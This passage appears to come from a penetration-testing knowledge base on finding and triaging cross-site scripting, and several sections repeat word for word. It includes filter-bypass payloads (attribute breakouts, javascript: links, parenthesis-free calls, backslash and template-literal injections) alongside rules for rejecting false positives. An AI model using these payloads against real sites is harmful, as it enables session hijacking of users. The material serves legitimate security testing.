*Disproof:* This is wrong if the source is read but its value only ever reaches a safe sink such as textContent or setAttribute, or never reaches any execution-capable sink.

**The URL is the most common DOM XSS source, and the payload can ride in the query string, the fragment, or the path.**

Since the fragment and query never reach the server, a page that builds DOM content from window.location can be vulnerable while every server-side test passes clean. Test the fragment first — it survives server-side filtering untouched — then the query string, then the path on 404 pages and PHP handlers. The delivery test is a link the victim clicks with the payload already in the URL, which is what makes DOM XSS reportable without any attacker-controlled stored content.

*Disproof:* This is wrong if the application reads the location and immediately decodes or strips it before any use, or if the page never passes the value into a sink that renders or executes it.

**Injected markup with an id or name attribute creates a window/document property that shadows built-in APIs, turning attacker markup into a live configuration object.**

Browsers create a property on window and document for named HTML elements, and those references resolve ahead of built-in APIs when script reads a window or document attribute. So injected markup such as <img id=x> makes x a live object; go further and inject a form and an anchor with matching name attributes to fabricate a form-like object with a method and action, and any code reading document.x.method gets the attacker's value. This converts a markup-only injection into control of program logic, and it is why a CSP that blocks inline script may still leave the page exploitable.

*Disproof:* This is wrong if the page never reads the clobbered property, if the injected markup cannot set an id or name attribute in that position, or if the code uses getElementById or a scoped lookup that bypasses named property access.

**Cache-based XSS is a browser-local abuse with two beats: the attacker-influenced bytes must first be sitting in the victim's own cache, and the payload only lands on a second, history-driven navigation that re-serves them in a more dangerous context.**

Cache-based XSS is a browser-local abuse with two beats: the attacker-influenced bytes must first be sitting in the victim's own cache, and the payload only lands on a second, history-driven navigation that re-serves them in a more dangerous context.

HackTricks reference: Chrome Cache to XSS (pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md)

*Disproof:* A payload that executes on the initial request with nothing cached beforehand, or that never needs a history navigation to fire, refutes the two-step cache-then-navigate structure.

**The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.**

The same injection in an extension is triaged by where it lands, not by whether it 'works': script in a Manifest V3 service worker is a message/API and code-injection review because there is no DOM to modify, while a sandboxed page is the documented exception to the usual MV3 CSP rule.

HackTricks reference: BrowExt - XSS Example (pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md)

*Disproof:* A payload that reaches a DOM sink and executes as page JavaScript from a Manifest V3 service worker, or a sandboxed page that inherits the host extension's CSP and APIs, refutes this context-based split.

**When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.**

When reflected data is placed inside a script block, terminating the script element is enough to get an event handler out of it, so escaping single quotes in that context buys nothing and the tester should probe the script context rather than the quoted string.

HackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)

*Disproof:* A reflected value containing a closing script tag sequence that neither terminates the block nor produces any new element or handler in the rendered page refutes the escapability.

**The DOM sink to hunt for is a message handler that assigns the received event data straight into innerHTML, which makes the injected markup execute in the receiving page's origin.**

The DOM sink to hunt for is a message handler that assigns the received event data straight into innerHTML, which makes the injected markup execute in the receiving page's origin.

HackTricks reference: post message xss (https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md)

*Disproof:* If the same handler writes the message through a text-only assignment, or the written content does not execute script or event handlers, the sink is not exploitable.

**The DOM sink to hunt for is a message handler that assigns the received event data straight into innerHTML, which makes the injected markup execute in the receiving page's origin.**

The DOM sink to hunt for is a message handler that assigns the received event data straight into innerHTML, which makes the injected markup execute in the receiving page's origin.

HackTricks reference: post message xss (https://kathan19.gitbook.io/howtohunt/xss/post_message_xss.md)

*Disproof:* If the same handler writes the message through a text-only assignment, or the written content does not execute script or event handlers, the sink is not exploitable.

**In an HTML attribute-value context, terminating the value and adding an event-handler attribute executes script even when angle brackets are blocked.**

Send a double quote to close the attribute, append an attribute that fires without interaction (autofocus plus onfocus) and a trailing quote to repair the markup, for example " autofocus onfocus=alert(document.domain) x=". Confirm the host CSP does not block inline handlers before treating a failed execution as proof the parameter is safe.

*Disproof:* The quote is escaped or the value re-quoted so no additional attribute can be injected, or a strict CSP blocks inline event handlers outright.

**An href attribute value is already a script-capable context, so a javascript: pseudo-protocol executes script without terminating the attribute at all.**

Some attribute types can execute script on their own, with no breakout. When reflection lands in the href of an anchor tag, injecting javascript:alert(document.domain) runs as soon as the link is followed, and there is no quote to escape and no tag to close. This is the case to test first whenever a parameter is reflected into a URL-bearing attribute, because it defeats filters that only strip angle brackets and quotes. Note the user's own click is required, which changes the delivery question but not the sink.

*Disproof:* This is wrong if the application URL-encodes the value so the scheme is no longer at the start of the attribute, strips javascript: case-insensitively, or the attribute is rendered inert with no user interaction possible.

**In an HTML attribute-value context, terminating the value and adding an event-handler attribute executes script even when angle brackets are blocked.**

When reflection lands inside an attribute value, the useful breakout is the quote character, not the angle bracket. Terminate the value, close the tag, and introduce an attribute that is itself scriptable — for example " autofocus onfocus=alert(document.domain) x=" — then repair the following markup with x=" so the page still parses. Because most applications that block < and > leave the quote untouched, this reaches execution where a tag-injection payload never will. The trailing x=" matters: leaving the original attribute dangling produces a syntax error that can stop the whole script from running.

*Disproof:* A finding here is wrong if the application escapes or re-quotes the value so no new attribute can be injected, or if a strict CSP blocks inline event handlers outright.

**In the HTML body context the payload must introduce entirely new tags, because the reflection point has no existing quote or delimiter to escape.**

Text between HTML tags offers no delimiter to terminate, so the only route is to introduce new markup that triggers script execution — an img with an onerror handler, or a script block. This is the simplest context and also the one most likely to be filtered, because a naive blocklist usually targets angle brackets and the words script and onerror. Probe it first to learn what the filter does, then move to attribute and script contexts where the same blocklist is usually ineffective.

*Disproof:* This is wrong if the response is not parsed as HTML at all — for example the endpoint returns application/json and nothing inserts the body into a document — or if every introduced tag is stripped or its event handler neutralised.

**Closing an enclosing script tag works because the browser parses HTML before JavaScript, so the injected script is parsed and executed even though the original script is left broken.**

When reflection lands in raw JavaScript, closing the enclosing script tag and opening a new one achieves execution without touching string syntax at all. It works because the browser performs HTML parsing to identify elements including script blocks first, and only then performs JavaScript parsing to execute them — so the original script being left broken with an unterminated string does not prevent the following script from running in the normal way. Understanding this ordering is what explains why a payload that looks syntactically invalid in the source still fires.

*Disproof:* This is wrong if the application escapes the closing sequence so the script tag cannot be terminated, or if the value sits inside an external JS file rather than inline HTML, where the browser never re-parses it as markup.

**Inside a quoted JavaScript string literal the payload must both escape the string delimiter and repair the trailing script, because any syntax error prevents execution.**

A reflected value inside a quoted string can be escaped with '-alert(document.domain)-' or ';alert(document.domain)// . Repair matters as much as escaping: a leftover dangling fragment becomes a syntax error that kills the entire script block, so the payload appears correct in the response yet never executes. This is the classic false-negative trap — the payload is present in the page source and the alert never fires. Always confirm execution in a browser rather than reading the response.

*Disproof:* This is wrong if the application escapes the delimiter so the string cannot be terminated, or if the value is placed in a context that is not a string literal at all.

**An application that backslash-escapes quotes without escaping the backslash itself is bypassed by prefixing the payload with its own backslash.**

Blocking single quotes with a backslash invites a one-character bypass. If the application turns ' into \', and fails to escape the backslash, an attacker-supplied backslash neutralises the application's own escape: input \';alert(document.domain)// becomes \\';alert(document.domain)//, where the first backslash makes the second literal and the quote terminates the string. Always test this whenever quote escaping is observed — it is one of the highest-yield checks against hand-rolled escaping and costs a single request.

*Disproof:* This is wrong if the application escapes backslashes first, or uses a vetted encoder or JSON serialiser for the value, in which case the attacker's backslash is itself escaped.

**A JSON response served as text/html and interpolated into a page becomes an HTML injection point even though the body is JSON.**

For each JSON endpoint record the response Content-Type. If the body holding attacker input is served as text/html and is then fetched and written into the DOM (fetch().then(r=>r.text()) into innerHTML, a server-side include of the JSON, or a client template rendering the raw body), the string context is an HTML context. Verify by injecting markup that must break out of the JSON or JS string to reach an executable element.

*Disproof:* The endpoint returns application/json and no code path inserts the response body into an HTML document, so injected markup is never parsed as markup.

## Variations

**A CSP only blocks inline or foreign script execution; nonces, hashes and strict-dynamic decide whether an injected payload can still run.**

Read the Content-Security-Policy header and classify it. script-src 'self' or a domain allowlist still permits injected inline handlers when unsafe-inline is present; a nonce-based or hash-based policy blocks injected script unless the nonce is exposed in the page or a script-src JSONP-style endpoint can be abused. Then check DOM sinks that write into a nonce-bearing script element, where injected markup inherits the trusted nonce and executes.

*Disproof:* The policy is nonce- or hash-based with an unguessable per-load nonce and no unsafe-inline, and the payload yields no element carrying a matching nonce or hash.

**HTML-encoding characters the filter blocks defeats it inside an event-handler attribute, because the browser HTML-decodes attribute values before JavaScript runs.**

When a value is reflected into a scriptable attribute such as onclick and the filter blocks the quote character, HTML-encoding it works around the filter. The browser HTML-decodes tag attribute values after parsing the tags but before the JavaScript is interpreted, so &#39; becomes a real apostrophe and terminates the string. The application never sees a dangerous character and the payload never contains a raw one, so a character-level blocklist passes it. Test this whenever blocking is observed in an attribute context — it is a decoding-order mismatch, not a broken filter.

*Disproof:* This is wrong if the browser decodes the attribute only once and the application re-encodes after decoding, or if the sink is textContent or a DOM property that receives the still-encoded value without HTML decoding.

**A filter blocking parentheses is bypassed by invoking the function without them, for example with a throw statement and a global exception handler.**

Character filters that remove parentheses can be defeated by calling the target function with no parentheses at all. Assigning the function to the global error handler and then throwing — onerror=alert;throw 1 — passes the argument through the exception handler instead of an argument list. Several variants exist, including ones that avoid the equals sign and the semicolon. This matters because parentheses are the single most commonly filtered character in naive XSS filters, and this bypass turns a blocked payload into a working one without any encoding trick.

*Disproof:* This is wrong if the filter also blocks the throw keyword, the semicolon, or the equals sign, or if the application CSP forbids inline handlers so no assignment is ever reached.

**A nonce-based CSP only blocks injected inline script, so DOM sinks and dangling markup remain exploitable under the same policy.**

Read the policy before grading a finding. A nonce must be securely generated on each page load and not guessable, and the same value must appear in the tag that loads the script — if the values do not match the script will not execute. That stops an injected inline script tag, but it does nothing to a source reaching an existing execution sink, to dangling markup exfiltration, or to a clobbered configuration object. A CSP that blocks inline script is therefore not a reason to close a DOM XSS candidate; enumerate what the policy leaves open.

*Disproof:* This is wrong if the policy is nonce- or hash-based with an unguessable per-load nonce and the payload yields no element carrying a matching nonce or hash AND no other reachable sink exists.

**In a JavaScript template literal the payload does not need to escape the backtick, because the ${...} expression syntax executes during literal processing.**

Template literals are delimited by backticks and evaluate embedded ${...} expressions, which inverts the usual escaping logic. Because the expression is evaluated when the literal is processed, injecting ${alert(document.domain)} executes script while the literal itself stays syntactically intact — no delimiter is broken and nothing needs repairing. Filter evasion follows directly: a filter watching for backticks, quotes and angle brackets sees none of them in this payload. Check every reflected value for the ${ and } characters, and remember an expression may also be evaluated in server-side templates by a different engine.

*Disproof:* This is wrong if the application escapes $ or the brace characters, or if the value is interpolated by a templating engine that does not evaluate expressions at all.

**A stored-XSS sink can sit in a message header rather than a web request: the payload is stored alongside the message and later rendered by the mail client, where one click is enough to run it, so mail-rendering paths deserve the same stored-XSS attention as web pages.**

A stored-XSS sink can sit in a message header rather than a web request: the payload is stored alongside the message and later rendered by the mail client, where one click is enough to run it, so mail-rendering paths deserve the same stored-XSS attention as web pages.

HackTricks reference: XSS (Cross Site Scripting) (pentesting-web/xss-cross-site-scripting/README.md)

*Disproof:* A stored message whose header payload the client never renders, or which needs more than the single user click to execute, refutes this stored-XSS primitive.

## Technology / Framework Considerations

Not yet researched.

## API Considerations

Not yet researched.

## Attack Chains

- `xss-reflected-to-privileged-action` — Reflected XSS on an authenticated surface to privileged in-origin actions (goal: `account_takeover`)

## Real-World Examples

Not yet researched.

## Common False Positives

**Reject a report's 'steals session cookies' impact claim when the session cookie carries the HttpOnly attribute, and restate the impact as in-origin action on behalf of the victim instead.**

Why it looks vulnerable: the XSS itself may be completely real and the boilerplate impact section reaches for cookie exfiltration out of habit - 'document.cookie' to the attacker's endpoint, replay the cookie, done. Reporting impact you have not verified is the most common way a genuine finding gets downgraded to 'unvalidated/invalid' by triage.
The mechanism: HttpOnly tells the browser to keep the cookie out of the document.cookie API. Script running in the page cannot read it, so the exfiltration payload has nothing to send - the chain terminates at the sink. Note the scope of that protection precisely: it protects the cookie's CONFIDENTIALITY, not the ability of the injected script to act. The session cookie is still automatically attached by the browser to every request the injected script makes to the origin, so the attacker keeps full request capability under the victim's session - they can read and write data, change settings, recover stored credentials, or issue privileged same-origin requests. The finding is not dead; only the stated impact is wrong.
Exactly what observation kills it: look at the Set-Cookie header on the response that establishes the session and check for HttpOnly. Then, inside your own injected script, print document.cookie - if the session cookie name is absent from that output, the theft chain is broken. Restate the report: 'arbitrary JavaScript in the victim's authenticated origin' with the specific same-origin actions available, and note the residual confidentiality path - a session-fixation or password-reset token, or a password-manager autofill value, is still reachable even when the cookie itself is not.

*Disproof:* The rule is wrong if the session cookie lacks HttpOnly and document.cookie returns it to injected script, in which case full session replay IS achievable and the original impact claim stands. It is also wrong when the sensitive credential is not the cookie at all - a JWT or API token in localStorage or sessionStorage, or a CSRF token readable from the DOM, is unaffected by HttpOnly. Read the Session Management cheat sheet's own warning before assuming HttpOnly helps: it only protects the confidentiality of that one cookie.

**Reject a DOM or reflected XSS candidate when the live page ships a CSP whose script-src carries a nonce or hash source without unsafe-inline and without strict-dynamic, because your injected inline script and inline event handlers cannot execute.**

Why it looks vulnerable: the markup injection is real - your marker sits unencoded in an HTML-executing context - so the defect is genuine even when nothing happens when the victim clicks. Reporting 'I injected a script tag and it did not fire' as a working XSS overstates it.
The mechanism: a nonce-based CSP names a specific cryptographically random value in the header and requires the same value on any script tag that should run; if the values do not match, the script will not execute, and the nonce must be securely generated on each page load and unguessable or it is not a control. Under that policy an injected <script>alert(1)</script> carries no nonce, so the browser refuses it - and because there is no 'unsafe-inline', an injected inline event handler such as onerror= is refused too. Hash-based CSP works the same way with 'sha256-...' matching an exact script body. strict-dynamic is the trap that reverses this verdict: it TRUSTS scripts loaded by an already-trusted nonced script to inject further scripts, so an injection inside such a page can still execute and the CSP does not save you - verify whether it is present before concluding either way.
Exactly what observation kills it: read the Content-Security-Policy response header on the exact response that renders the injection (not the homepage), and open the browser console - a blocked script produces a violation message naming the directive. If the console reports refusal to execute the inline script for that policy and no dialog appears, downgrade the finding to 'injection blocked by CSP - defence in depth only', or report the missing nonce/hash as a CSP misconfiguration finding instead. If the console is clean, your CSP reasoning is wrong and it is a live XSS.

*Disproof:* The rule is wrong when the policy contains 'unsafe-inline' (or 'unsafe-eval' for eval-style payloads), or when strict-dynamic is present and the injection point runs on a page that already loaded a nonced/hash-trusted script - in both cases a nonce-less injected script is executed anyway and the finding is a full XSS. It is also wrong if the CSP is only a report-only header (Content-Security-Policy-Report-Only), which logs violations without blocking anything.

**Reject a DOM clobbering or prototype-pollution XSS candidate when the clobbered or polluted property is only read as a string into textContent, an attribute or a URL fetch, and never reaches an HTML parser or script-execution context.**

Why it looks vulnerable: you injected <img id=foo src=x onerror=alert(1)> and you can see foo now shadows a page global, or you polluted Object.prototype with a property that the application reads. Both are genuinely dangerous primitives, and prototype pollution is commonly rated as RCE - so the instinct is to report XSS. The report then quietly assumes an HTML-execution step that was never demonstrated.
The mechanism: DOM clobbering is a code-REUSE attack, not code injection. Named HTML element references come before lookups of built-in APIs on window and document, so an injected id/name collides with a security-sensitive variable and the application then uses the ELEMENT (or its string coercion) instead. The consequences depend entirely on what the application does with the clobbered value: swapped into an object property or a decision branch you get defacement, logic bugs or data exposure; the value handed to a parser or an execution primitive is where it becomes script execution. Note the concrete trap: when an object is clobbered it refers to an Element instance, which may not be the expected type - so a report claiming 'my clobbered string reached innerHTML' must show the string coercion happening first, and must show that the assignment target really is an HTML-parsing sink. A clobbered property read for a fetch URL, a feature flag or a comparison is not XSS, though it may deserve its own lower-severity finding.
Exactly what observation kills it: trace the clobbered/polluted property to its terminal use and classify that use. If it ends in textContent, a setAttribute, a fetch/URL assignment, or an if-comparison, put a breakpoint at that read and show the value being consumed as data - no element is created from it, and there is no script execution. If instead you can show the value arriving at innerHTML, insertAdjacentHTML, document.write, a script src assignment or eval, this rule is wrong: that is real XSS and the clobbering is your delivery mechanism.

*Disproof:* The rule is wrong if the clobbered or polluted property is later assigned into an HTML-executing sink - a clobbered script src/iframe src whose value navigates to attacker markup, or a polluted property consumed by a template that renders it as HTML - because that is script execution with an injection-only primitive, and it is a real XSS. OWASP's own note that CSP mitigates clobbering of script sources but not already-present code that can be abused for execution is the same distinction seen from the mitigation side.

**Reject a reflected XSS candidate when the reflected value appears in the response only as HTML entities or percent/unicode escapes that the browser decodes back to inert text in that context, because encoding is what makes the reflection non-exploitable.**

Why it looks vulnerable: your unique probe string comes back in the response body at the exact location you expected, so 'the input is reflected' is satisfied and the report writes itself. Reflection is only the first third of the claim; the second third is whether the reflected bytes can terminate the context they sit in.
The mechanism that kills it: output encoding converts < > " ' & into &lt; &gt; &quot; &#39; &amp;, so the browser's HTML tokeniser never sees a tag or an attribute delimiter - the value is delivered as data, not as markup. The kill test is context-specific, which is where most wrong reports die: in an HTML tag-attribute value you need to break the attribute with a quote before you can add an event handler, and if the quote is entity-encoded you cannot; in the HTML body you need angle brackets, and if those are encoded you cannot. CWE-79 makes the corresponding precision requirement explicit: HTML entity encoding is only appropriate for the HTML body, so also verify that the encoding applied matches the context you are testing, rather than assuming 'encoded' means 'safe'.
Exactly what observation kills it: fetch the response with the marker in the parameter and read the RAW bytes around the reflection point - do not read the rendered DOM, because the browser will have decoded the entities and the rendered view looks like your literal payload. If you see &lt;script&gt; or %3Cscript%3E in the raw response, and the rendered node contains a text node (not a <script> element, not an <img> with a live handler), the candidate is a false positive. Also check for double-encoding: if the raw body shows &amp;lt; the value is over-encoded and still inert; a single decode pass yields literal '&lt;'.

*Disproof:* The rule is wrong if the encoding is applied for the wrong context - for example only HTML-entity-encoded output dropped inside a JavaScript string, a URL, a CSS value or an unquoted attribute, where &quot; and &#39; do not neutralise a quote delimiter and a ';alert(1)// payload still breaks the string. It is also wrong if the entity is decoded and re-serialised anywhere before rendering (a client-side read of .innerHTML followed by a re-write, or a client-side template that re-interprets the text as HTML), because then the inert text becomes live markup.

**Reject a JSON API endpoint reported as XSS when the response Content-Type is application/json and no client-side code path inserts the reflected value into an HTML document.**

Why it looks vulnerable: you POST {"name":"<script>alert(1)</script>"} to /api/profile and the string comes back verbatim in the response body - a clean taint-to-reflection path with a classic payload. Report writers then label the endpoint XSS because the words 'attacker-controlled' and 'unencoded' are both present.
The mechanism that kills it: whether injected markup executes is decided by how the RESPONSE IS DELIVERED and CONSUMED, not by whether the body contains angle brackets. With Content-Type application/json the browser renders the body as text in its JSON/plain-text viewer, never as an HTML document, so there is no parser that can be tricked into creating elements or running script. X-Content-Type-Options: nosniff removes the browser's ability to second-guess that declared type. The rule is therefore: the endpoint is only an XSS if a second, HTML-typed surface exists - the same value fetched by a page that interpolates it into a template, rendered server-side into an HTML view, or navigated to directly with a text/html content type (a JSONP-style callback or a download/open-in-browser path are the usual escape hatches).
Exactly what observation kills it: capture the raw HTTP response and read the Content-Type header. If it is application/json (with or without nosniff), navigate a browser directly to the URL and confirm the payload renders as inert text rather than executing, then grep the application's JavaScript for any fetch/XHR of that endpoint whose result is written to innerHTML, insertAdjacentHTML, document.write, a framework v-html/dangerouslySetInnerHTML binding, or an eval. With no such code path, this is an API input-validation/injection finding at most, not XSS. If you find one, the XSS belongs to that client-side code path - report it there with the DOM sink named.

*Disproof:* The rule is wrong if the same reflected value reaches an HTML-executing context through any code path: the API is called by a front end that assigns the response into innerHTML or a framework's raw-HTML binding, the endpoint is reachable at the same path with a text/html or JSONP callback content type, or the server renders the stored value into an HTML page for other users. Then the JSON body is only the delivery mechanism, and the finding is a genuine XSS located at the sink.

**Injection that survives a server-side markup-to-HTML renderer (Markdown, Textile, wiki syntax) but never reaches a script-execution context in the delivered page is a content-injection issue, not XSS, and must not be reported as XSS without a browser-confirmed execution trace.**

Server-side markup renderers are a classic source of XSS false positives, because the renderer's output is visibly full of angle brackets and the injection is obvious in the raw HTML. But a renderer that escapes or strips the dangerous constructs produces inert markup: the tag text is present in the response, and no script runs. Rails' own security guide is candid that a renderer such as RedCloth is itself vulnerable, and separately that a permitted-list sanitiser plus output escaping is what actually stops the injection - the point being that the renderer's transformation is a stage, not the sink. The hunter's job is to identify the second stage: which script, handler, or navigation consumes this markup, and whether it is reachable. A wiki comment rendered to escaped <p> and <strong> is a formatting bug; the same comment reaching a profile field rendered as raw HTML, or a client that reads the same field into innerHTML, is XSS.

*Disproof:* The rule collapses when the rendered markup is later consumed by a sink: a client-side viewer that fetches the same field and assigns it to innerHTML, a print/export pipeline that re-injects it, an email client that renders it, or a second page that echoes the raw stored value. It is also wrong if the renderer emits script-capable constructs by design - raw HTML passthrough, a custom block that permits <iframe>, inline event handlers, or javascript: links - in which case the renderer's own output is the sink and the injection is XSS. And a payload confirmed executing in a real browser, with a second observable such as a network beacon, is XSS by definition regardless of which stage introduced it.

**Reject a prototype-pollution finding reported as XSS unless the polluted property value is read back and written into an HTML-executing sink, because polluting Object.prototype alone executes no script in any page.**

Why it looks vulnerable: you can set __proto__.isAdmin or Object.prototype.polluted = '<img src=x onerror=alert(1)>' through a recursive merge and read it back on every object in the app. Prototype pollution is frequently rated critical and the tainted-looking value sits right there on the prototype - so it gets reported as stored XSS because 'the payload is in the data model'. It is not: nothing has rendered it.
The mechanism: prototype pollution is a state-corruption primitive. Writing an attacker value onto Object.prototype makes every object inherit it, which yields privilege bypass, denial of service or logic corruption depending on what the code does with the property. XSS requires the additional, separate step of that value being inserted into a document through an HTML-parsing sink - innerHTML, outerHTML, insertAdjacentHTML, document.write, a script src assignment - at which point the parser turns the characters into an element with an event handler and the browser runs it. OWASP's guidance is that pollution itself can lead to unauthorized access, privilege escalation and even remote code execution, but each of those requires a downstream gadget; the write alone is not code execution, and CVE-level severity for prototype pollution comes from the reachability of such a gadget, not from the write.
Exactly what observation kills it: after polluting, trace where the property is READ and what happens to it. Grep the codebase for the property name; if every read is a truthiness check, a config lookup, a comparison or a string that only ever reaches textContent, there is no HTML parser in the path and the finding is not XSS - report it as prototype pollution with the gadget that does exist (privilege check, deny-list, EJS/handlebars option object), or note the missing Object.create(null) / Object.freeze defences. Break in DevTools on writes to the polluted key: if no element appears in the DOM and no script executes, the rule holds. If a live element appears, this rule is wrong and it is real XSS.

*Disproof:* The rule is wrong if the polluted property is consumed by a templating engine or a client-side render that inserts it as markup - a server-side template interpolating the inherited property, or front-end code writing it to innerHTML or a raw-HTML framework binding - because then the pollution is the injection primitive and the result is stored XSS reachable by every user of the app. Equally, if the pollution reaches a code-execution gadget (a template engine option object, a child-process invocation), that is RCE, which is a stronger finding than the XSS report claimed.

**A reflected XSS on an anonymous, read-only page is not automatically informational; it still executes script in every visitor's origin.**

When a reflected XSS sits on a page with no authentication and no sensitive data, do not close it as brochureware only. Establish what the injected script can reach in-origin from that page: same-origin API calls the anonymous session may make, request-token exposure, and any authenticated surface reachable if a logged-in user follows a link. Rate the finding on that reach, not on page data sensitivity alone.

*Disproof:* The page's origin exposes no authenticated state, no same-origin privileged endpoints and no tokens reachable from injected script, leaving only a bare popup.

**User input echoed verbatim into a response served with Content-Type: application/json, text/plain, or application/octet-stream is not reflected XSS unless the browser can be made to parse that response as HTML: XSS requires the payload to reach an HTML or script execution context, not merely to be reflected.**

Capture the full response header block first. The reflection is the precondition, the execution context is the finding: ZAP's reflected-XSS writeup makes the browser the actor, and the browser executes the payload because it arrived from a trusted server - a JSON body delivered as application/json is never parsed as a document, so no execution follows. Sonar's mXSS research is the relevant counter-case, showing that HTML parsing itself stays ambiguous across parsers, which is exactly why the content type and the downstream sink decide the verdict rather than the presence of angle brackets. Follow the data one more hop: if the JSON field is later assigned through an unsafe sink such as innerHTML, document.write or eval, the finding is real and belongs at the sink, not at the echo. Hunting value: this filters the API/echo/search-preview flood, since JSON APIs, GraphQL responses, plain-text status pages, CSV and file downloads and 4xx error bodies all reflect attacker input by design while never entering a document context.

*Disproof:* It IS XSS if the same parameter also lands in an HTML response, if the Content-Type is absent or set to a sniffable value so a browser renders it as HTML, or if the API output is later written into the DOM through an unsafe sink (innerHTML, document.write, eval). Test the sink path, not the echo.

**A filter that only deletes the literal string "script" from user input is not a control at all: the surrounding angle brackets survive, so the injected tag remains well-formed and still executes.**

This is the canonical example of why deny-lists fail, and it is worth internalising as a validation reflex: whenever a report says the app 'filters out script tags', check what the filter removes. A keyword-level delete leaves the '<' and '>' untouched, so the payload assembles itself after the filter runs. Rails documents the failure and the fix together: permitted-list filtering states the values allowed, and restricted lists are never complete. In the field this changes what you test - you do not conclude 'the app strips script tags, so no XSS'; you inject a split-tag payload and see whether the filter operates on the tag name, the whole element, or a substring. Note the deeper trap: a permitted-list sanitiser can still be incomplete if the allow-list itself includes a dangerous attribute or URL scheme.

*Disproof:* The rule is false if the filter is a real parser-based sanitiser rather than a substring delete - a tokenising HTML sanitiser that rebuilds the document from a permitted list of elements and attributes neutralises the split-tag payload because the brackets are consumed as part of a rejected tag, not left orphaned. It is also false if a downstream layer re-encodes or re-parses, or if the filter strips all angle brackets rather than a keyword. And the rule is only about the filter: if the value is separately output-escaped at render time, the split payload is inert regardless of what the filter did.

**Reject a sanitizer-bypass XSS claim when the rendered page shows the payload as inert text with the dangerous markup stripped, because a payload that does not become live DOM in the browser is not a bypass.**

Why it looks vulnerable: the application calls a sanitizer, and sanitizers are exactly the component with a long history of filter bypasses - so 'the filter only strips <script>, therefore onerror works' is an easy paper exploit. The paper payload is then written up without anyone confirming what the browser actually rendered.
The mechanism that kills it: sanitization returns a safe string of HTML, and the observation that matters is the DOM the browser builds from it, not the payload you typed. If the sanitizer stripped the element, event handler or javascript: URL, the surviving characters are inserted as TEXT - the marker is visible in the rendered output as literal characters, no element with a live handler exists, no beacon fires and no console error appears from your payload. Two specific failure modes produce false bypass claims: (a) the payload was neutralised because the sanitizer ran, and the researcher read the SOURCE (where the payload's quote characters are visibly escaped) instead of the RENDERED result; (b) the researcher assumed the removal of <script> meant all event handlers were removed, when the sanitiser in the page has a sanitisation profile that strips them too. Also remember the reverse caution from the same guidance - sanitizing and then mutating the string afterwards voids the protection - so 'it was inert' must be checked at the sink, after any mutation.
Exactly what observation kills it: reproduce with the exact payload in a real browser against the live page and inspect the resulting DOM. If your <img> element simply does not exist (only a text node does) and no onerror handler is bound in the Elements panel, and a fetch/XHR to your callback URL is absent from the network log, the payload is inert and the bypass claim fails - downgrade it to a note about the sanitiser's behaviour. If a real element with a live event handler appears and your callback receives a request, this rule is wrong.

*Disproof:* The rule is wrong if a real element with a live event handler or a navigable javascript:/data: URL is present in the rendered DOM and your callback endpoint receives the request - that is a genuine sanitizer bypass and a real XSS, even if the sanitizer appeared to strip <script>. The rule also does not apply where the string is sanitized and then mutated or re-serialised before insertion, since the protection can be voided downstream; check the sink, not the sanitizer call.

**Reject an XSS candidate as unproven when the payload can only be made to render by pasting attacker-supplied JavaScript into the submitter's own address bar or console, because that is self-XSS and not a cross-user finding.**

Why it looks vulnerable: the page genuinely reflects an attacker string into an HTML context and genuinely lacks output encoding, so the code-level defect is real and a scanner will flag it. The trap is that 'the response contains my attacker-controlled markup unsanitised' is not the same as 'another user executes it'.
The mechanism: self-XSS is the case where the attacker cannot reach a victim through a crafted URL or a cross-origin request. The only delivery is social engineering - the victim is talked into pasting the payload into their own browser address bar or console, so the script runs in the submitter's own origin, own session and own screen. Nothing crosses a user boundary: there is no victim, no cross-user exposure, and no server-side trust failure being exploited. PortSwigger classifies this explicitly as a lame, low-impact issue, and MITRE's CWE-79 narrative makes the same point from the other side: the danger of reflected XSS comes from an attacker constructing a URL and luring a victim into clicking it.
Exactly what observation kills it: build the attacker's URL yourself with the payload in the parameter, and try to deliver it to a second party. If you cannot produce a link or auto-submitting form that fires in a DIFFERENT user's browser - because the value must be typed/pasted into the page itself, or because the parameter is a POST body the victim never submits - the candidate is self-XSS. Close your own browser, open a clean one, and confirm the payload never fires without you typing it. Report it as a low-severity hardening note or file it separately; do not write a cross-user XSS report on it.

*Disproof:* The candidate stops being self-XSS the moment a working delivery exists: a crafted URL (or a CSRF-style auto-submitting form) that fires the payload automatically in any other user's browser, on a page an authenticated victim visits. Then it is ordinary reflected XSS and this rejection rule is wrong. Equally, if the 'pasting' step is not required because the value is stored and later rendered to other users, the finding is stored XSS, not self-XSS.

**Reject a DOM-based XSS candidate when the traced attacker-controlled source only ever reaches textContent, innerText, or setAttribute with a hardcoded non-event attribute, because those sinks treat the value as text and never parse it as markup.**

Why it looks vulnerable: the hunter has proven the source is attacker-controlled (location.hash, location.search, document.referrer, postMessage data, an API field) and has seen their marker echoed back in the DOM, so the taint half of the XSS chain is already established and the report feels 90% done. The usual next step is to assume the value is dangerous because it is attacker-supplied, without ever classifying the sink it lands in.
The mechanism that kills it: execution-capable sinks are the set of APIs that PARSE their argument as markup or as script - innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln, eval, setTimeout/setInterval with a string body, Function(), and the script.src / iframe.src style navigations. Assignment through textContent or innerText creates a single Text node; the browser never runs a tokeniser over the string, so <img onerror=...> survives only as literal characters. setAttribute(name, value) is safe only for the narrow safe-attribute list, and OWASP's XSS Prevention sheet is explicit that this safety holds only as long as the attribute NAME is hardcoded and innocuous - the moment the attribute name comes from the same tainted data (or is an event handler such as onClick/onerror/onfocus), setAttribute becomes an injection sink and the candidate is real.
Exactly what observation kills it: in DevTools, set a breakpoint on the assignment and read the call - if the property assigned is textContent/innerText, or the setAttribute second argument targets a safe name, the payload renders as literal text in the Elements panel and no dialog, no beacon request and no console error from your payload appears. Confirm with a canary: an <img src=x onerror=alert(1)> marker will appear verbatim as TEXT in the rendered node, never as an <img> element. If the same marker DOES become a real element with a live onerror handler, this rule is wrong and you have a genuine DOM XSS - which is exactly the disproof below.

